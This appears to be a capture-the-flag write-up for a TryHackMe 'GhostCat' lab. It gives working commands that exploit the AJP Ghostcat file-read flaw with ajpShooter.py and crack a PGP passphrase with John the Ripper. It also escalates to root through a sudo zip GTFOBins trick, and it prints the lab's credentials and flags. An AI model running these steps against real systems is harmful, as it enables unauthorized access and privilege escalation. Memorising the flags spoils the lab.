## Prompt : Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

## IP : 10.10.222.139
As usual we run the Nmap sacn on the IP.

### Nmap Result:

### Getting Credential - 1:
As we can see port 8080 and port 8009 are open and **ajp13** service is running on it. so we can exploit it using **ajpshooter.py**

`python3 ajpShooter.py http://10.10.222.139:8080/ 8009 /WEB-INF/web.xml read`

```

After running the script we get a Username and password for login to ssh server.
`User:skyfuck
Password:8730281lkjlkjdqlksalks`
Using the username and password we get a stable shell in which we are user skyfuck.

Listing the files we get a suspicious files named **tryhackme.asc** and **credential.pgp** so we can use **GnuPG** to decrypt the files 

### Getting Creditials - 2:
`gpg --import tryhackme.asc`

![](https://i.imgur.com/yVR4lSq.png)

`gpg --decrypt credential.pgp`

![](https://i.imgur.com/0Q15K52.png)

It is asking for a passphrase to login. For getting the passphrase we can use **JohntheRipper**. So first we convert the pgp private key (file name used as pgp) to john hash so it can decrypt it.

![](https://i.imgur.com/xCZmnfU.png)

`$ john hash --wordlist=/usr/share/wordlist/rockyou.txt`

We get the passphrase : **alexandru**

After logging in we get credentials of user **merlin**. We use these credential to login as merlin.

Listing the directory we get the file user.txt which contains the user flag 

![](https://i.imgur.com/zOHfjGy.png)

`User Flag : THM{GhostCat_1s_so_cr4sy} `
### Escalting Privileges:

Using sing sudo -l command we get to know that the user merlin can use **/usr/bin/zip** as root. So using Gtfobins we get the exploit for **zip** binary if we can run it as sudo to get the root shell.

`$ TF=$(mktemp -u)`
`$ sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #' `

Now we read the root flag from **/root/root.txt** 

`Root Flag : THM{Z1P_1S_FAKE}`
